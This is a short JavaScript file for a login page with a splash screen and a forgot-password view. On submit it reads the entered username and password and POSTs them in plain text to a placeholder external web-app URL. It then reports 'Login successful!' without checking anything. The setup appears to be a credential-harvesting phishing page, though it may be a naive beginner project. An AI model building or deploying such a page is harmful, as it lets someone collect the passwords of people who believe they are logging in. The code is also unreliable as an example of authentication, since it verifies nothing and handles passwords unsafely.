const SCRIPT_URL = "PASTE_YOUR_WEB_APP_URL_HERE";

document.addEventListener("DOMContentLoaded", function () {

/* Splash → Login */
setTimeout(() => {
document.getElementById("splash").style.display = "none";
document.getElementById("loginPage").style.display = "block";
}, 2500);

/* Form submit */
const form = document.getElementById("loginForm");

form.addEventListener("submit", function(e) {
e.preventDefault();

const data = {
  username: form.username.value,
  password: form.password.value
};

fetch(SCRIPT_URL, {
  method: "POST",
  body: JSON.stringify(data)
})
.then(() => {
  alert("Login successful!");
  form.reset();
})
.catch(() => {
  alert("Error sending data");
});

});

});

/* Forgot page */
function showForgot() {
document.getElementById("loginPage").style.display = "none";
document.getElementById("forgotPage").style.display = "block";
}

function goBack() {
document.getElementById("forgotPage").style.display = "none";
document.getElementById("loginPage").style.display = "block";
}